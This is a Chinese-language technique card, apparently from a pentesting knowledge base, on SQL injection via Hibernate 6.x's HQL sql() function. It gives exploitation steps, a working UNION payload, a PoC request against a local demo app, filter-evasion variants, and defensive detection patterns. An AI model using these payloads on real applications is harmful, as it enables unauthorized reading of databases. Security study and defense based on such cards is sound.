---
id: web-generic-sqli-hibernate-hql-sql-function-escape
title: Hibernate 6.x HQL `sql()` 函数逃逸：把原生 SQL 片段无引号嵌入生成语句，闭合后 UNION 读任意表
type: scenario
domain: web
path: web/generic/sqli
technique: hibernate-hql-sql-function-native-sql-injection
aliases:
- HQL sql() 逃逸
- Hibernate sql 函数注入
- HQL 6.x 原生 SQL 嵌入
- sql function escape
tags:
- sqli
- java
- hibernate
- hql
- orm
- union
- mysql
cve: []
severity: high
confidence: high
affected_versions: Hibernate 6.x（sql() 为 6.x 新增，5.x 不支持）
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V279
  verified_at: '2026-11-07T23:38:54+08:00'
  notes: 已对照原文核对：6.x sql() 把 pattern 去引号原样嵌入生成 SQL，payload mysql'+and+sql('1=2+union+select+table_name,table_schema+from+information_schema.tables%23')='1 与 img/26-32 的文档、生成 SQL、information_schema 回显一致；原文只标注『6.x 新增、5.x 不支持』，未写 6.0.1，affected_versions 已按原文改为 6.x。dup-scan 判与 function() 卡 likely_duplicate，经原文裁决为不同机制（sql() 仅 6.x、pattern 整体脱引号；function() 第一参数作函数名并追加括号、5.x/6.x 通用），保留不删。
---

## 一句话结论

Hibernate 6.x 的 HQL `sql()` 函数会把第一个字符串参数**去掉引号后原样嵌入**生成的 SQL（`?` 占位再由后续参数替换），本意是嵌入原生 SQL 片段；当用户输入被拼进 HQL 字符串字面量时，攻击者可注入 `sql('1=2 union select ...#')`，让其中的 `1=2 union select ...` 直接成为生成 SQL 的一部分，从而越过 HQL 映射限制读取任意表。

## 原理

- `sql(pattern[, argN]*)` 的语义：`pattern` 必须是字符串字面量，但生成 SQL 时它会被**unquoted**（去掉引号）嵌入；pattern 中的 `?` 用后面的参数替换。原文两种调用形式：`sql('select 1,2,3')` 与 `sql('select 1,2,?','3')`。
- 因此 `sql()` 的参数不是数据值，而是 SQL 语法片段制造机：只要攻击者能让 `sql('...')` 出现在 HQL 中，括号内的内容就会在翻译后脱离引号约束进入 SQL 语法层。
- 在拼接注入点中，先闭合原字符串，再用 `and sql('...')` 把片段接到 WHERE 条件上；HQL 侧 `sql()` 是合法函数调用，能通过语法检查，翻译后片段与前后 SQL 拼接执行。
- 版本边界（原文标注）：`sql()` 是 6.x 新增，5.x 不支持；原文在 6.x 环境实测，注入后 Hibernate 日志显示生成的语句中已是 `and 1=2 union select table_name,table_schema from information_schema.tables#='1'`。
- 与 `function()` 的区别：`sql()` 只在 6.x 可用且参数整体作为 SQL 片段；`function()` 把第一参数当函数名并在后追加 `()`，5.x/6.x 通用。

## 触发条件

- 目标使用 Hibernate 6.x（`sql()` 可用），且用户输入被字符串拼接进 `createQuery()` 的 HQL 字面量。
- 注入位置可放入表达式：`... and sql('...')='1'` 能通过 HQL 语法（`sql()` 返回表达式，作为比较操作数）。
- 后端数据库语法与嵌入片段匹配（原文为 MySQL；`#` 用于注释掉 HQL 收尾的 `='1'`）。
- 应用未对 `sql(`、`function(` 等 HQL 关键字做输入过滤；WAF 未识别 HQL 函数注入特征。
- UNION 列数/类型需与实体映射的 SELECT 列表对齐。

## 利用步骤

1. 确认 Hibernate 6.x：报错栈出现 `org.hibernate.hql` / `QuerySqmImpl` 等 6.x 包名，或业务方版本信息。
2. 先验证 `and 1=1` / `and 1=2` 布尔差分，确认单引号闭合与注入点。
3. 构造 `mysql' and sql('1=2 union select table_name,table_schema from information_schema.tables#')='1`：HQL 侧合法；SQL 侧变成 `... and 1=2 union select table_name,table_schema from information_schema.tables#='1'`。
4. URL 编码发送：`?name=mysql'+and+sql('1=2+union+select+table_name,table_schema+from+information_schema.tables%23')='1`。
5. 响应回显 `information_schema` 的表名/库名（原文实测返回 `innodb_table_stats`、`CHARACTER_SETS`、`CHECK_CONSTRAINTS` 等），说明已逃逸到原生 SQL 层。
6. 按需替换 UNION 后半段枚举列、读业务表；也可用 `?` 占位形式（`sql('...?',value)`）规避对引号的依赖。
7. 注意 `sql()` 是表达式而不是完整语句：单独写 `and sql('select version()')='1'` 会生成 `and select version()='1'` 这类非法语法，必须构造能嵌进表达式上下文（如 `1=2 union select ...`）的片段。

## PoC

原文环境最小请求（未在本机执行）：

```http
GET /VulDemo/SQLDemo5?name=mysql'+and+sql('1=2+union+select+table_name,table_schema+from+information_schema.tables%23')='1 HTTP/1.1
Host: 127.0.0.1:8080
```

Hibernate 生成并被 MySQL 执行的语句：

```sql
select u1_0.table_name, u1_0.table_schema from tables u1_0
where u1_0.table_schema='mysql' and 1=2
union select table_name,table_schema from information_schema.tables#='1'
```

响应中出现 `information_schema` 的表名列表，即注入成功。

## 变体与关联

- 占位变体：`sql('1=2 union select ?,? #',table_name,table_schema)` 可把部分内容预编译替换，减少请求中的引号/关键字特征。
- 版本关联：Hibernate 6.x 才支持 `sql()`；同版本若 `sql()` 被禁用或过滤，可改用 5.x/6.x 通用的 `function()` 关键字逃逸；5.6.15 之前还可尝试反斜杠差分逃逸。
- 关联：基础 HQL 层面注入（不逃逸）仍受映射表/字段限制；`sql()` 逃逸后等同原生 SQL 注入，可读 `information_schema`、文件读写/堆叠能力取决于数据库账号与驱动配置。

## 检测与防御

- 根因修复：HQL 全部参数化（`:name`/`?` + `setParameter`），禁止拼接；不要允许用户输入进入 HQL 函数名/函数参数位置。
- 版本与特性：评估禁用或限制 HQL `sql()`（以及 `function()`）能力；升级/配置无法替代参数化。
- 检测：请求参数出现 `sql(`、`function(`、`union select`、`information_schema`、`#`/`%23` 等组合；Hibernate SQL 日志中出现 `and 1=2 union select` 且来自用户参数；HQL 报错中泄露生成语句。
- 审计：搜索 `createQuery(` 拼接点与 Hibernate 6.x 依赖；对暴露给前端的搜索/列表接口做注入回归测试。
